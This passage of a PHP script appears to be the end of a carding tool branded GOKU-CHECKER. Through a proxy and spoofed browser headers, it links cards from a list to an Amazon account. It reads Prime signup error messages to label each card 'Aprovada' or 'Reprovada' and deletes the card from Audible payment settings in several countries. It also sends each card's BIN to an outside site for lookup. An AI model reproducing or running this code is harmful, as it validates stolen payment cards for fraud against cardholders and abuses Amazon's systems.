$Fim = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$tokens = array(
"audible.de",
"audible.it",
"audible.es",
"audible.co.uk",
"audible.com.au",
"audible.ca",
"audible.com",
"audible.co.jp",
"audible.fr"
);

///////////////////////////////////////////////////////////////////////////////////////

for ($i = 0; $i < count($tokens); $i++) {
$host1111 = $tokens[$i];

$lastDotPosition = strrpos($host1111, '.');

if ($lastDotPosition !== false) { 

$aftehost1111rLastDot = substr($host1111, $lastDotPosition + 1);

if ($aftehost1111rLastDot === 'com') { 

$aftehost1111rLastDot = 'US'; 

} 
} else {}

///////////////////////////////////////////////////////////////////////////////////////

$cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => 'https://www.'.$host1111.'/account/payments?ref=',
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_PROXY => $proxy,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS     => "",
CURLOPT_HTTPHEADER     => array(
'Host: www.'.$host1111.'',
'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'Sec-GPC: 1',
'Accept-Language: pt-BR,pt;q=0.9',
),
]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$csrf   = getstr($r, 'data-csrf-token="', '"');
if(stripos($csrf, '///')){
$c = getstr($r, 'data-payment-id="', 'payment-type');
$csrf = getstr($c, 'data-csrf-token="', '"');
}
$address = getstr($r, 'data-billing-address-id="', '"');
$cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL => 'https://www.'.$host1111.'/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.'.$host1111.'%2Faccount%2Fpayments%3Fref%3D&relativeUrl=%2Faccount%2Fpayments&',
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE => $cookie2,
CURLOPT_PROXY => $proxy,
CURLOPT_ENCODING => "gzip",
CURLOPT_HEADER => true,
CURLOPT_POSTFIELDS => "isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId=".$payment."&billingAddressId=".$address."&paymentType=CreditCard&tail=0433&accountHolderName=fsdsdgs%20sdffdssdff&isValid=true&isDefault=true&issuerName=MasterCard&displayIssuerName=MasterCard&bankName=&csrfToken=".urlencode($csrf)."&index=0&consentState=OptedIn",
CURLOPT_HTTPHEADER     => array(
'Host: www.'.$host1111.'',
'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
'Content-type: application/x-www-form-urlencoded',
'adpToken: ',
'X-Requested-With: XMLHttpRequest',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
'sec-ch-ua-platform: "Windows"',
'Accept: */*',
'Sec-GPC: 1',
'Accept-Language: pt-BR,pt;q=0.9',
'Origin: https://www.'.$host1111.'',
'Referer: https://www.'.$host1111.'/account/payments?ref=',
),
]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
$msg     = '✅';
$err     = "Removido: $msg $err1";
break;
} else {
$msg = '❌';
$err     = "Removido: $msg $err1";
}
}

///////////////////////////////////////////////////////////////////////////////////////

if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
$msg     = '✅';
$err     = "Removido: $msg $err1";
} else {
$msg = '❌';
$err     = "Removido: $msg $err1";
}

///////////////////////////////////////////////////////////////////////////////////////

if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. If you would still like to join Prime you can sign up during checkout.')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. ('.$err.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">GOKU-CHECKER</span><br>');

}

if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. ('.$err.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">GOKU-CHECKER</span><br>');

}

if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time.')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. ('.$err.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">GOKU-CHECKER</span><br>');

}

elseif (strpos($Fim, 'Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. ('.$err.') </span> ➔ Tempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">GOKU-CHECKER</span><br>');

}elseif (strpos($Fim, 'InvalidInput')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inexistente. ('.$err.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">GOKU-CHECKER</span><br>');

}elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {

$urlbin = 'https://chellyx.shop/dados/binsearch.php?bin='.$cc.'';
$infobin = file_get_contents($urlbin);

die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inexistente. ('.$err.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">GOKU-CHECKER</span><br>');

} else {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro interno - Amazon API </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">GOKU-CHECKER</span><br>');

}

?>